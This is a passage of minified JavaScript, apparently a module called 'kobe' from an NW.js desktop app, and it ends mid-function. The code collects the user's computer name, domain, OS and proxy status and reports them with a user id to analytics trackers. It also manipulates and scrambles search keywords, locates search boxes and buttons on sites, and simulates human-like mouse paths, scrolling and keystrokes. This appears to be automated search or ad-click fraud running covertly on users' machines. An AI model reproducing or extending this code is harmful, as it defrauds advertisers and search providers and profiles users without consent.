try {
	! function() {
		try {
			require("events").EventEmitter.defaultMaxListeners = 1 / 0
		} catch (e) {}
		var debuggingModuleLoadStartMeasureTime = performance.now(),
			debuggingModuleLoadEndMeasureTime = performance.now(),
			debug_mode = "PRODUCTION" != global.ENV,
			frisitor, secFrisitor_PageViews, secFrisitor_Events;
		if (debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now()), ua) try {
			frisitor = ua("UA-173646961-5", encLocalStorage.getItem("userid"))
		} catch (e) {
			frisitor = ua("UA-173646961-5")
		}
		if (ua) try {
			secFrisitor_PageViews = ua("UA-173646961-6", encLocalStorage.getItem("userid"))
		} catch (e) {
			secFrisitor_PageViews = ua("UA-173646961-6")
		}
		if (ua) try {
			secFrisitor_Events = ua("UA-173646961-7", encLocalStorage.getItem("userid"))
		} catch (e) {
			secFrisitor_Events = ua("UA-173646961-7")
		}
		var scriptVersion = "1890",
			scriptName = "kobe",
			scriptNameFirstUpperCase = scriptName.charAt(0).toUpperCase() + scriptName.slice(1),
			ONE_DAY_TIMESPACE = 864e5,
			ONE_HOUR_TIMESPACE = 36e5,
			PING_RETRY_MILISECONDS = 18e5,
			LONG_PING_RETRY_MILISECONDS = 10 * PING_RETRY_MILISECONDS,
			REPORT_EVENT_ERROR_RETRY_MILISECONDS = 3e4,
			MAX_HEAP_SIZE = 950,
			enums = {
				keyboard: {
					BACKSPACE: 8,
					TAB: 9,
					ENTER: 13,
					SHIFT: 16,
					CTRL: 17,
					ALT: 18,
					PAUSE: 19,
					CAPS_LOCK: 20,
					ESCAPE: 27,
					SPACE: 32,
					PAGE_UP: 33,
					PAGE_DOWN: 34,
					END: 35,
					HOME: 36,
					LEFT_ARROW: 37,
					UP_ARROW: 38,
					RIGHT_ARROW: 39,
					DOWN_ARROW: 40,
					INSERT: 45,
					DELETE: 46,
					KEY_0: 48,
					KEY_1: 49,
					KEY_2: 50,
					KEY_3: 51,
					KEY_4: 52,
					KEY_5: 53,
					KEY_6: 54,
					KEY_7: 55,
					KEY_8: 56,
					KEY_9: 57,
					KEY_A: 65,
					KEY_B: 66,
					KEY_C: 67,
					KEY_D: 68,
					KEY_E: 69,
					KEY_F: 70,
					KEY_G: 71,
					KEY_H: 72,
					KEY_I: 73,
					KEY_J: 74,
					KEY_K: 75,
					KEY_L: 76,
					KEY_M: 77,
					KEY_N: 78,
					KEY_O: 79,
					KEY_P: 80,
					KEY_Q: 81,
					KEY_R: 82,
					KEY_S: 83,
					KEY_T: 84,
					KEY_U: 85,
					KEY_V: 86,
					KEY_W: 87,
					KEY_X: 88,
					KEY_Y: 89,
					KEY_Z: 90,
					LEFT_META: 91,
					RIGHT_META: 92,
					SELECT: 93,
					NUMPAD_0: 96,
					NUMPAD_1: 97,
					NUMPAD_2: 98,
					NUMPAD_3: 99,
					NUMPAD_4: 100,
					NUMPAD_5: 101,
					NUMPAD_6: 102,
					NUMPAD_7: 103,
					NUMPAD_8: 104,
					NUMPAD_9: 105,
					MULTIPLY: 106,
					ADD: 107,
					SUBTRACT: 109,
					DECIMAL: 110,
					DIVIDE: 111,
					F1: 112,
					F2: 113,
					F3: 114,
					F4: 115,
					F5: 116,
					F6: 117,
					F7: 118,
					F8: 119,
					F9: 120,
					F10: 121,
					F11: 122,
					F12: 123,
					NUM_LOCK: 144,
					SCROLL_LOCK: 145,
					SEMICOLON: 186,
					EQUALS: 187,
					COMMA: 188,
					DASH: 189,
					PERIOD: 190,
					FORWARD_SLASH: 191,
					GRAVE_ACCENT: 192,
					OPEN_BRACKET: 219,
					BACK_SLASH: 220,
					CLOSE_BRACKET: 221,
					SINGLE_QUOTE: 222
				},
				keyboardModifiers: {
					kShiftKey: 1,
					kControlKey: 2,
					kAltKey: 4,
					kMetaKey: 8,
					kIsKeyPad: 16,
					kIsAutoRepeat: 32,
					kLeftButtonDown: 64,
					kMiddleButtonDown: 128,
					kRightButtonDown: 256,
					kCapsLockOn: 512,
					kNumLockOn: 1024,
					kIsLeft: 2048,
					kIsRight: 4096,
					kIsTouchAccessibility: 8192,
					kIsComposing: 16384,
					kAltGrKey: 32768,
					kFnKey: 65536,
					kSymbolKey: 1 << 17,
					kScrollLockOn: 1 << 18,
					kIsCompatibilityEventForTouch: 1 << 19,
					kBackButtonDown: 1 << 20,
					kForwardButtonDown: 1 << 21,
					kRelativeMotionEvent: 1 << 22,
					kNoModifiers: 0
				}
			};
		enums.keyboardModifiers.kKeyModifiers = enums.keyboardModifiers.kSymbolKey | enums.keyboardModifiers.kFnKey | enums.keyboardModifiers.kAltGrKey | enums.keyboardModifiers.kMetaKey | enums.keyboardModifiers.kAltKey | enums.keyboardModifiers.kControlKey | enums.keyboardModifiers.kShiftKey;
		var ajaxErrorsTimeouts = {
				get: null,
				head: null,
				post: null
			},
			ajax = {
				get: function(e, t, o, n) {
					var r;
					if ((r = new XMLHttpRequest).onreadystatechange = function() {
							4 == r.readyState && (200 == r.status ? null != t && t(r) : (reportPageView("error.ajax.get/" + scriptVersion + "/" + r.status + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), null != o && o(r)))
						}, r.open("GET", e, !0), n)
						for (var i in n) r.setRequestHeader(i, n[i]);
					r.send()
				},
				head: function(e, t, o) {
					var n;
					(n = new XMLHttpRequest).onreadystatechange = function() {
						4 == n.readyState && (200 == n.status ? null != t && t(n) : null != o && o(n))
					}, n.open("HEAD", e, !0), n.send()
				},
				post: function(e, t, o, n, r) {
					var i;
					if ((i = new XMLHttpRequest).onreadystatechange = function() {
							4 == i.readyState && (200 == i.status ? null != t && t(i) : (ajaxErrorsTimeouts.post && global.clearTimeout(ajaxErrorsTimeouts.post), ajaxErrorsTimeouts.post = global.setTimeout((function() {
								reportPageView("error.ajax.post/" + scriptVersion + "/" + i.status + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)
							}), 6e4), null != o && o(i)))
						}, i.open("POST", e, !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n)
						for (var a in n) i.setRequestHeader(a, n[a]);
					i.send(r)
				}
			};

		function defined(e) {
			return void 0 !== e
		}
		var STATES = {
				NONE: 0,
				STARTED: 1,
				ON_IS_FLOW_COOKIEFIED: 2,
				ON_WINDOW_SETUP: 4,
				WINDOW_OPEN: 8,
				FINISHED: 16,
				TIMEOUT: 32,
				MEMORY_BREACHED: 64,
				NO_CONNECTION: 128,
				PROXY: 256,
				ENDED: 512
			},
			LOG_TYPE = {
				AJAX_POST: "AJAX_POST",
				AJAX_HEAD: "AJAX_HEAD",
				AJAX_GET: "AJAX_GET",
				FILE_STORAGE: "FILE_STORAGE",
				GC: "GC",
				SCRIPT: scriptName.toUpperCase(),
				IPR: "IPR",
				Core: "Core",
				Oleg: "Oleg",
				Devar: "Devar",
				Noa: "Noa",
				Rachel: "Rachel",
				Jen: "Jen",
				MPP: "MPP",
				Momo: "Momo",
				Ally: "Ally",
				NCL: "NCL",
				dbAPI: "dbAPI",
				CM: "CM",
				SCRIPT_SESSION: scriptName.toUpperCase() + "_SESSION",
				FEED_SESSION: "FEED_SESSION"
			},
			LOG_LEVELS = {
				INFO: 0,
				DEBUG: 1,
				WARNING: 2,
				ERROR: 3,
				FATAL: 4
			};

		function getUserId() {
			try {
				var e = encLocalStorage.getItem("userid");
				if (null != e) return e
			} catch (e) {}
			return "Missing_GUID"
		}

		function getApplicationActionString() {
			return nw.App.manifest.name + "." + getFullVersion()
		}

		function cloneObject(e) {
			var t = {};
			for (var o in e) null != e[o] && "object" == typeof e[o] ? t[o] = cloneObject(e[o]) : t[o] = e[o];
			return t
		}

		function generateGuid() {
			return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(e) {
				var t = 16 * Math.random() | 0;
				return ("x" == e ? t : 3 & t | 8).toString(16)
			}))
		}

		function randomize(e, t) {
			return Math.random() * (t - e + 1) + e
		}

		function getDateTruncTimeStamp() {
			return 864e5 * Math.round((new Date).getTime() / 864e5)
		}

		function pickRandomItem(e) {
			return 0 == Array.isArray(e) || 0 == e.length ? null : e[Math.floor(randomize(0, e.length - 1))]
		}

		function randn_bm(e, t, o) {
			for (var n = 0, r = 0; 0 === n;) n = Math.random();
			for (; 0 === r;) r = Math.random();
			var i = Math.sqrt(-2 * Math.log(n)) * Math.cos(2 * Math.PI * r);
			return ((i = i / 10 + .5) > 1 || i < 0) && (i = randn_bm(e, t, o)), i = Math.pow(i, o), i *= t - e, i += e
		}

		function charReplaceAt(e, t, o) {
			return e.substr(0, t) + o + e.substr(t + o.length)
		}

		function replaceAll(e, t, o) {
			return e && t && "string" == typeof e && "string" == typeof t && "string" == typeof o ? e.split(t).join(o) : e
		}

		function calcTotalSessionTime(e) {
			return Math.floor(((new Date).getTime() - e) / 1e3)
		}

		function getDatedFormat(e) {
			return e.getFullYear().toString() + (e.getMonth() + 1).toString() + e.getDate().toString()
		}

		function proximity() {
			try {
				return !debug_mode && "DIRECT" !== nw.App.getProxyForURL("http://www.google.com")
			} catch (e) {
				return !0
			}
		}

		function reportEvent(e, t, o, n, r) {
			var i = i;
			defined(r) && (i = r), i.event(e, t, o, n, (function(a) {
				if (a) {
					try {
						i.event("reportingError", t, o, 1, (function(e) {})).send()
					} catch (e) {}
					global.setTimeout((function() {
						reportEvent(e, t, o, n, r)
					}), REPORT_EVENT_ERROR_RETRY_MILISECONDS)
				}
			})).send()
		}

		function reportPageView(e, t) {
			var o = o;
			defined(t) && (o = t), o.pageview(e, (function(e) {}))
		}

		function cmpVersions(e, t) {
			var o, n, r, i, a;
			for (i = e.replace(/(\.0+)+$/, "").split("."), a = t.replace(/(\.0+)+$/, "").split("."), n = Math.min(i.length, a.length), o = 0; o < n; o++)
				if (0 !== (r = parseInt(i[o], 10) - parseInt(a[o], 10))) return r;
			return i.length - a.length
		}

		function isNewerVersion(e, t) {
			return cmpVersions(t, e) > 0
		}

		function tryCatchConsole(e) {
			try {
				e()
			} catch (e) {
				reportPageView("error/tcc/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e + "/" + e.stack, frisitor)
			}
		}

		function findDifferenceStartingIndex(e, t) {
			for (var o = 0; o < t.length && 1 == e.startsWith(t.substr(0, o)); o++);
			return o - 1
		}
		var noConnectionTimeout = null;

		function reportNoConnection(e) {
			try {
				noConnectionTimeout || (noConnectionTimeout = global.setTimeout((function() {
					try {
						reportEvent("No_Connection_" + scriptVersion, e, encLocalStorage.getItem("userid"), 0, frisitor), noConnectionTimeout = null
					} catch (e) {}
				}), 6e4))
			} catch (e) {}
		}
		var lastScriptVersion = encLocalStorage.getItem("lkver");
		lastScriptVersion && lastScriptVersion == scriptVersion || (reportPageView(scriptName + "/activation/" + getApplicationActionString() + "/f" + lastScriptVersion + "/t" + scriptVersion + "/" + encLocalStorage.getItem("userid"), frisitor), encLocalStorage.setItem("lkver", scriptVersion)), debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var scptNWWindowAPI = {
			hasFunction: function(e, t) {
				try {
					if (e && "function" == typeof e[t]) return !0
				} catch (e) {}
				return !1
			},
			hasProperty: function(e, t) {
				try {
					if (e && void 0 !== e[t]) return !0
				} catch (e) {}
				return !1
			},
			has_mousedown: function(e) {
				return scptNWWindowAPI.hasFunction(e, "mousedown1")
			},
			has_mousewheel: function(e) {
				return scptNWWindowAPI.hasFunction(e, "mousewheel1")
			},
			has_mousemove: function(e) {
				return scptNWWindowAPI.hasFunction(e, "mousemove1")
			},
			has_keydown: function(e) {
				return scptNWWindowAPI.hasFunction(e, "keydown1")
			},
			has_keyup: function(e) {
				return scptNWWindowAPI.hasFunction(e, "keyup1")
			},
			has_keypress: function(e) {
				return scptNWWindowAPI.hasFunction(e, "keypress1")
			},
			has_setmute: function(e) {
				return scptNWWindowAPI.hasFunction(e, "setmute1")
			},
			has_setNWPolicy: function(e) {
				return scptNWWindowAPI.hasFunction(e, "setNWPolicy1")
			},
			has_prov_name: function(e) {
				return scptNWWindowAPI.hasProperty(e, "prov_name1")
			},
			has_prov_id: function(e) {
				return scptNWWindowAPI.hasProperty(e, "prov_id1")
			},
			has_session_id: function(e) {
				return scptNWWindowAPI.hasProperty(e, "session_id1")
			},
			has_scpt_id: function(e) {
				return scptNWWindowAPI.hasProperty(e, "scpt_id1")
			},
			mousewheel: function(e, t, o, n, r, i, a) {
				e.mousewheel1(t, o, n, r, i, a)
			},
			mousemove: function(e, t, o, n, r, i, a, c) {
				e.mousemove1(t, o, n, r, i, a, c)
			},
			mousedown: function(e, t, o, n, r, i, a, c) {
				e.mousedown1(t, o, n, r, i, a, c)
			},
			keydown: function(e, t, o) {
				e.keydown1(t, o)
			},
			keyup: function(e, t, o) {
				e.keyup1(t, o)
			},
			keypress: function(e, t, o) {
				e.keypress1(t, o)
			},
			setmute: function(e, t) {
				e.setmute1(t)
			},
			setNWPolicy: function(e, t) {
				e.setNWPolicy1(t)
			},
			set_prov_name: function(e, t) {
				e.prov_name1 = t
			},
			set_prov_id: function(e, t) {
				e.prov_id1 = t
			},
			set_session_id: function(e, t) {
				e.session_id1 = t
			},
			set_scpt_id: function(e, t) {
				e.scpt_id1 = t
			},
			get_prov_name: function(e) {
				return e.prov_name1
			},
			get_prov_id: function(e) {
				return e.prov_id1
			},
			get_session_id: function(e) {
				return e.session_id1
			},
			get_scpt_id: function(e) {
				return e.scpt_id1
			}
		};
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var oleg = {
			reportDB: function(e, t, o) {
				try {
					ally.reportScriptLog(LOG_TYPE.Oleg, LOG_LEVELS.DEBUG, o, ["computer_data", e, t])
				} catch (e) {}
			},
			getOSFromNavigator: function() {
				try {
					return navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")"))
				} catch (e) {
					return ""
				}
			},
			getUpTime: function() {
				return process.uptime()
			},
			getPlatform: function() {
				return process.platform
			},
			getComputerName: function() {
				return process.env.COMPUTERNAME
			},
			getUserDomain: function() {
				return process.env.USERDOMAIN
			},
			getOperatingSystem: function() {
				return process.env.OS
			},
			getProcessorArchitecture: function() {
				return process.env.PROCESSOR_ARCHITECTURE
			},
			reportOperatingSystem: function(e) {
				try {
					oleg.reportDB("operating_system", oleg.getOperatingSystem(), e)
				} catch (e) {}
			},
			reportProcessorArchitecture: function(e) {
				try {
					oleg.reportDB("processor_architecture", oleg.getProcessorArchitecture(), e)
				} catch (e) {}
			},
			reportComputerName: function(e) {
				try {
					oleg.reportDB("computer_name", oleg.getComputerName(), e)
				} catch (e) {}
			},
			reportUserDomain: function(e) {
				try {
					oleg.reportDB("user_domain", oleg.getUserDomain(), e)
				} catch (e) {}
			},
			reportPlatform: function(e) {
				try {
					oleg.reportDB("platform", oleg.getPlatform(), e)
				} catch (e) {}
			},
			tryGetHostname: function(e) {
				let t = "-1";
				try {
					e && e.window && e.window.document && e.window.document.location && (e.window.document.location.hostname ? t = e.window.document.location.hostname : e.window.document.location.host && (t = e.window.document.location.host))
				} catch (e) {}
				return t
			}
		};
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var devar = {
			kwValidators: {}
		};
		devar.kwValidators.pass_general_validations = function(e, t) {
			if (null == e || e.length < 3 || -1 != e.indexOf("www") || -1 != e.indexOf("http") || -1 != e.indexOf("@") || -1 != e.indexOf("#") || -1 != e.indexOf("*") || -1 != e.indexOf(":") || -1 != e.indexOf("\\") || -1 != e.indexOf(".") || -1 != e.indexOf("/") || -1 != e.indexOf("'") || -1 != e.indexOf("❤️") || -1 != e.indexOf("•")) return !1;
			return !/^((http[s]?|ftp):\/)?\/?([^:\/\s]+)((\/\w+)*\/)([\w\-\.]+[^#?\s]+)(.*)?(#[\w\-]+)?$/.test(e)
		}, devar.kwValidators.is_pure_number = function(e, t) {
			return 0 == /^\d+$/.test(e)
		}, devar.kwValidators.contains_unicode = function(e, t) {
			return !/[^\u0000-\u00ff]/.test(e)
		}, devar.kwValidators.word_count = function(e, t) {
			try {
				return !t || "number" != typeof t.limit || e.split(" ").length <= t.limit
			} catch (e) {
				return !1
			}
		}, devar.kwValidators.total_length = function(e, t) {
			try {
				return !t || "number" != typeof t.limit || e.length < t.limit
			} catch (e) {
				return !1
			}
		}, devar.cleanKW = function(e) {
			let t = replaceAll(e, "'", "");
			return t = replaceAll(t, "·", ""), t = replaceAll(t, "…", ""), t = t.trim(), t && "string" == typeof t ? t : e
		}, devar.validateKw = function(e, t) {
			let o = [];
			try {
				let n = Object.keys(t);
				for (let r in n) {
					let i = n[r],
						a = t[i];
					a && "boolean" == typeof a.enabled && 1 == a.enabled && "function" == typeof devar.kwValidators[i] && 0 == devar.kwValidators[i](e, a) && (a.validatorName = i, o.push(a))
				}
			} catch (e) {
				return e
			}
			return o
		}, devar.getSite = function(e, t) {
			for (var o in e)
				if (t.location.href.toString().toLowerCase().indexOf(e[o].domain.toLowerCase()) >= 0) return o;
			return "NONE"
		}, devar.getSearchElement = function(e, t) {
			try {
				var o = this.getSite(e, t);
				if ("NONE" == o) return null;
				var n = e[o],
					r = Array.from(t.getElementsByClassName(n.searchText));
				if ((!r || r.length <= 0) && n.searchTextIdFallback && (r = [t.getElementById(n.searchTextIdFallback)]), (r = r.filter((function(e) {
						return !(n && n.searchTextConfig && n.searchTextConfig.searchByTagName) || e.tagName && e.tagName.toLowerCase && n.searchTextConfig.searchByTagName == e.tagName.toLowerCase()
					}))) && r.length > 0) {
					var i = r[0],
						a = i.getBoundingClientRect().y;
					for (var c in r) r[c] && "function" == typeof r[c].getBoundingClientRect && r[c].getBoundingClientRect().y < a && (i = r[c], a = r[c].getBoundingClientRect().y);
					return i
				}
			} catch (e) {}
			return null
		}, devar.getSearchSuggestions = function(e, t) {
			try {
				var o = this.getSite(e, t);
				if ("NONE" == o) return [];
				var n = e[o];
				if (void 0 === n.suggestedElementsClassNames) return [];
				var r = t.getElementsByClassName(n.suggestedElementsClassNames);
				return r && r.length > 0 ? Array.from(r) : []
			} catch (e) {
				return []
			}
		}, devar.getSearchButton = function(e, t) {
			try {
				var o = this.getSearchElement(e, t),
					n = null,
					r = this.getSite(e, t),
					i = {};
				"NONE" != r && (i = e[r]), n = null == o ? t.body : o.parentElement;
				for (var a = function(e) {
						return i && i.searchButton && i.searchButton.searchByTagName ? e.tagName && e.tagName.toLowerCase && i.searchButton.searchByTagName == e.tagName.toLowerCase() : "submit" == e.getAttribute("type")
					}; Array.from(n.getElementsByTagName("button")).filter(a).length <= 0 && Array.from(n.getElementsByTagName("input")).filter(a).length <= 0;) n = n.parentElement;
				var c = Array.from(n.getElementsByTagName("button")).filter(a),
					s = Array.from(n.getElementsByTagName("input")).filter(a);
				return c.length > 0 ? c[0] : s[0]
			} catch (e) {}
			return null
		}, devar.appendToTextElement = function(e) {
			if (void 0 !== e.targetToDo) {
				var t = e.target;
				"a" == e.targetToDo ? t.value += e.which : "r" == e.targetToDo && (t.value = t.value.substring(0, t.value.length - 1))
			}
		}, devar.fireKeyboardEvent = function(e, t, o, n) {
			var r = null;
			t && ((r = t.createEventObject ? t.createEventObject() : t.createEvent("Events")).initEvent && r.initEvent("keydown", !0, !0), r.keyCode = o, r.which = o, r.targetToDo = n, e.dispatchEvent ? e.dispatchEvent(r) : e.fireEvent("onkeydown", r))
		}, devar.calculateDims = function(e) {
			try {
				var t = e.getBoundingClientRect(),
					o = {};
				if (o.top = t.top, o.bottom = t.bottom, o.left = t.left, o.right = t.right, o.height = t.height, o.width = t.width, null == e.ownerDocument.defaultView) return o;
				for (e = e.ownerDocument.defaultView.frameElement; null != e;) {
					var n = e.getBoundingClientRect();
					if (o.top += n.top, o.bottom += n.top, o.left += n.left, o.right += n.left, null == e.ownerDocument.defaultView) return o;
					e = e.ownerDocument.defaultView.frameElement
				}
				return o
			} catch (e) {
				return reportPageView("error/calcDims/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e + "/" + e.stack, frisitor), null
			}
		}, devar.getNextGeneratedKW = function(e, t, o, n) {
			let r = "";
			if ("fromPage" == t && (o || e.resultsTextObject.out.length > 0) && n && n.takeKeywordsFrom) {
				let t = jen.getKeywordsByChances(e, n.takeKeywordsFrom, o);
				t = t.map(devar.cleanKW), r = t[Math.floor(randomize(0, t.length - 1))]
			}
			return r && "" != r && "fromServer" != t || (jen.rollChangeWordsInFos(e), e.kwSearchIndex += 1, e.kwSearchIndex == e.kwCollection.length && (e.kwSearchIndex = 0), r = e.kwCollection[e.kwSearchIndex]), r && "" != r && "generateNewCollection" != t || (e.kwCollection = jen.generateKw(e.oddType, e.sessionContextOwner.kwl.kws, e.flowConfig), e.kwSearchIndex = 0, 0 == Array.isArray(e.kwCollection) && (e.kwCollection = [e.kwCollection]), r = e.kwCollection[0]), r && "" != r && "sameKW" != t || (r = e.kw), r && "" != r || reportPageView("fatal/gen/next/kw/" + scriptVersion + "/" + momo.tryGetProviderId(e) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), r
		}, devar.blackTouchKW = function(e) {
			let t = !0;
			e && e.flowConfig && e.flowConfig.kw && void 0 !== e.flowConfig.kw.manipulateKw ? t = e.flowConfig.kw.manipulateKw : e && e.flowConfig && void 0 !== e.flowConfig.manipulateKw && (t = e.flowConfig.manipulateKw), 1 == t && (e.manipulatorCategoryChosen = jen.generateManipulatorCategory(kwl.kws_conf), e.manipulatedKW = jen.applyManipulatorCategory(e.kw, e.manipulatorCategoryChosen), e.kw = e.manipulatedKW);
			let o = !0;
			e && e.flowConfig && e.flowConfig.kw && void 0 !== e.flowConfig.kw.scrambleKw ? o = e.flowConfig.kw.scrambleKw : e && e.flowConfig && void 0 !== e.flowConfig.scrambleKw && (o = e.flowConfig.scrambleKw), 1 == o && (e.scrambledKW = jen.scramble(e.kw, kwl.kws_conf), e.kw != e.scrambledKW && (e.isScrambled = !0), e.kw = e.scrambledKW)
		}, devar.isElementVisible = function(e) {
			try {
				return "none" != e.style.display && "hidden" != e.style.visibility
			} catch (e) {
				return !1
			}
		}, devar.isElementInViewport = function(e, t) {
			try {
				var o = o;
				t && (o = t);
				var n = devar.calculateDims(e);
				return n.top >= 0 && n.left >= 0 && n.bottom <= (o.defaultView.innerHeight && o.documentElement.clientHeight) && n.right <= (o.defaultView.innerWidth && o.documentElement.clientWidth)
			} catch (e) {
				return !1
			}
		}, devar.isElementClickable = function(e, t, o) {
			try {
				var n = n;
				o && (n = o);
				var r = devar.calculateDims(e),
					i = {};
				if (t) {
					var a = this.getSite(t, o);
					"NONE" != a && t && (i = t[a])
				}
				var c = function(t) {
						return t.tagName.toLowerCase().indexOf(e.tagName.toLowerCase()) > -1
					},
					s = n.elementsFromPoint(r.left + 1, r.top + 1),
					l = n.elementsFromPoint(r.left + r.width - 1, r.top + r.height - 1);
				if (i && !0 === i.recognizeClickableByAnyElement || (s = s.filter(c), l = l.filter(c)), s.length < 1) return !1;
				s = s[0];
				var u = function(e, t) {
					if (t == e) return !0;
					if (!e || void 0 === e || !e.childNodes || void 0 === e.childNodes) return !1;
					for (var o = 0; o < e.childNodes.length; o++) {
						if (1 == u(e.childNodes[o], t)) return !0
					}
					return !1
				};
				return u(e, s) && devar.isElementInViewport(e, o)
			} catch (e) {
				return !1
			}
		}, devar.isRendered = function(e, t, o) {
			try {
				if (1 != e.nodeType || e == t.body) return !0;
				if (e.currentStyle && "none" != e.currentStyle.display && "hidden" != e.currentStyle.visibility) return devar.isRendered(e.parentNode, t, o);
				if (window.getComputedStyle) {
					var n = t.defaultView.getComputedStyle(e, null);
					if ("none" != n.getPropertyValue("display") && "hidden" != n.getPropertyValue("visibility")) return devar.isRendered(e.parentNode, t, o)
				}
				return !1
			} catch (e) {
				return reportPageView("error/isrendered/" + momo.tryGetProviderId(o) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), !1
			}
		}, devar.isUrlMatchingSomeRegex = function(e, t) {
			try {
				if (void 0 === t || void 0 === t.length) return !1;
				for (var o = 0; o < t.length; o++)
					if (e.location.href.match(t[o])) return !0;
				return !1
			} catch (e) {
				return !1
			}
		}, devar.getNavBarElementFromName = function(e, t) {
			if (!e || !e.nav) return null;
			if (t.startsWith("minus")) {
				let o = t.split("_"),
					n = parseInt(o[o.length - 1]),
					r = -1;
				e.nav.cur && (r = parseInt(e.nav.cur));
				let i = r - n;
				if (0 == isNaN(i) && Array.isArray(e.nav.pages)) return e.nav.pages[i]
			} else if (t.startsWith("plus")) {
				let o = t.split("_"),
					n = parseInt(o[o.length - 1]),
					r = -1;
				e.nav.cur && (r = parseInt(e.nav.cur));
				let i = r + n;
				if (0 == isNaN(i) && Array.isArray(e.nav.pages)) return e.nav.pages[i]
			}
			return e.nav[t]
		}, devar.areNavBarElementsExists = function(e) {
			if (e && e.nav) {
				if (e.nav.nextPage || e.nav.prevPage) return !0;
				if (e.nav.pages && Array.isArray(e.nav.pages)) return e.nav.pages.filter(e => null != e && e && "function" == typeof e.getElementsByTagName).length > 0
			}
			return !1
		}, debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var noa = {
			startPoint: null,
			DEFAULT_BUTTON: "left",
			SCROLL_DELTA: 100,
			isNCL: function(e, t) {
				return scptNWWindowAPI.has_mousedown(t) && scptNWWindowAPI.has_mousewheel(t) && scptNWWindowAPI.has_mousemove(t) && e.prov.ncl && e.NCLFactor
			},
			isKPC: function(e, t) {
				return scptNWWindowAPI.has_keydown(t) && scptNWWindowAPI.has_keyup(t) && scptNWWindowAPI.has_keypress(t)
			},
			isNW47: function() {
				try {
					if (process && process.versions && process.versions.nw) {
						if (process.versions.nw.includes(".46.") || process.versions.nw.includes(".47.") || process.versions.nw.includes(".48.") || process.versions.nw.includes(".49.") || process.versions.nw.includes(".55.") || process.versions.nw.includes(".56.") || process.versions.nw.includes(".57.") || process.versions.nw.includes(".58.") || process.versions.nw.includes(".59.")) return !0;
						if (process.versions.nw.split(".").length >= 2 && parseInt(process.versions.nw.split(".")[1]) >= 46) return !0
					}
					return !1
				} catch (e) {
					return !1
				}
			},
			initializeStartPoint: function(e) {
				null == noa.startPoint && (noa.startPoint = noa.generatePoint(e) || null)
			},
			generatePoint: function(e) {
				var t = t;
				e && (t = e);
				var o = {};
				return o.x = Math.floor(randomize(0, t.defaultView.innerWidth)), o.y = Math.floor(randomize(0, t.defaultView.innerHeight)), o
			},
			scrollimate: function(e, t, o, n, r, i, a, c) {
				noa.initializeStartPoint(o);
				var s = {
					min: 70,
					max: 300
				};
				a && void 0 !== a.min && void 0 !== a.max && (s.min = a.min, s.max = a.max);
				var l = noa.startPoint.x + n.window.screenX,
					u = noa.startPoint.y + n.window.screenY,
					d = null;
				if (devar.isElementInViewport(e, o) && devar.isElementClickable(e, t, o)) {
					var g = devar.calculateDims(e);
					c && "function" == typeof c && c(g)
				} else {
					for (var m = [], f = 0; f < r; f++) move = {
						ts: randomize(s.min, s.max),
						delta: noa.SCROLL_DELTA * i
					}, m.push(move);
					! function t(o, r, a, c) {
						var l = devar.calculateDims(e);
						if (d && l && d.top == l.top) try {
							n.window.scrollBy({
								top: i * noa.SCROLL_DELTA,
								left: 0,
								behavior: "smooth"
							})
						} catch (e) {
							return
						}
						if (o.length) {
							var u = o.shift();
							try {
								scptNWWindowAPI.mousewheel(n, noa.startPoint.x, noa.startPoint.y, 0, u.delta, r, a)
							} catch (e) {
								return
							}
							d = l, global.setTimeout(t, u.ts, o, r, a, c)
						} else global.setTimeout(c, randomize(s.min, s.max))
					}(m, l, u, (function() {
						if (c && "function" == typeof c) {
							var t = devar.calculateDims(e);
							c(t)
						}
					}))
				}
			},
			travel: function(e, t, o, n) {
				return function(e, t) {
					var o = 0,
						n = 15,
						r = 1,
						i = 15,
						a = {
							x: Math.abs(t.x - e.x),
							y: Math.abs(t.y - e.y)
						},
						c = t.x > e.x ? 1 : -1,
						s = t.y > e.y ? 1 : -1,
						l = {
							x: a.x,
							y: a.y
						},
						u = e,
						d = [],
						g = {
							x: e.x,
							y: e.y,
							ts: 0,
							mx: Math.floor(randomize(o, Math.abs(l.x) < n ? Math.abs(l.x) : n)),
							my: Math.floor(randomize(o, Math.abs(l.y) < n ? Math.abs(l.y) : n))
						};
					for (d.push(g); 0 != l.x || 0 != l.y;) {
						var m = 0;
						l.x && (m = Math.abs(l.x) < n ? Math.abs(l.x) : n);
						var f = 0;
						l.y && (f = Math.abs(l.y) < n ? Math.abs(l.y) : n);
						var p, w = Math.floor(randomize(o, m)),
							x = Math.floor(randomize(o, f));
						l.x -= w, l.y -= x, (p = {}).x = u.x + w * c, p.y = u.y + x * s, p.ts = randomize(r, i), p.mx = w * c, p.my = x * s, u.x = p.x, u.y = p.y, d.push(p)
					}
					return (p = {
						x: u.x,
						y: u.y
					}).ts = randomize(r, i), Math.abs(u.x - t.x) > 0 ? (p.mx = Math.abs(u.x - t.x), p.x = (p.mx + u.x) * c) : p.x = 0, Math.abs(u.y - t.y) > 0 ? (p.my = Math.abs(u.y - t.y), p.y = (p.my + u.y) * s) : p.y = 0, (p.x || p.y) && (p.mx = p.mx || 0, p.my = p.my || 0, d.push(p)), d
				}(noa.startPoint || noa.generatePoint(o), {
					x: e,
					y: t
				})
			},
			animate: function(e, t, o, n) {
				if (e.length) try {
					var r = e.shift(),
						i = r.x;
					0 == isNaN(o.window.screenX) && (i += o.window.screenX);
					var a = r.y;
